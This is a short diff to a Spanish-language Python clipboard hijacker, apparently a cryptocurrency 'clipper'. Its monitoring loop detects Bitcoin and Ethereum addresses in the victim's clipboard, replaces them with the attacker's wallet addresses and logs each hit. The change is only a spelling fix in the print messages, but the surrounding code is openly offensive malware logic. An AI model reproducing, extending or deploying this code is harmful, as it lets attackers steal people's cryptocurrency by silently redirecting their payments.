@@ -67,7 +67,7 @@ def monitorear():
         #3 => Comparar portapapeles con reglas de BTC
         if mi_patron_btc.match(victima_portapapeles):
             pc.copy(settings.atacante_wallet_btc)
-            print("🚨 Encontrado Wallet Bitcoin. Remplazando... 😈")
+            print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "Wallet BTC")
 
         #Chequear Wallet ETH
@@ -78,7 +78,7 @@ def monitorear():
         #3 => Comparar portapapeles con reglas de ETH
         if mi_patron_eth.match(victima_portapapeles):
             pc.copy(settings.atacante_wallet_eth)
-            print("🚨 Encontrado Wallet Ethereum Remplazando... 😈")
+            print("🚨 Encontrado Wallet Ethereum Reemplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "Wallet ETH")
 
         #Chequear Wallet XMR
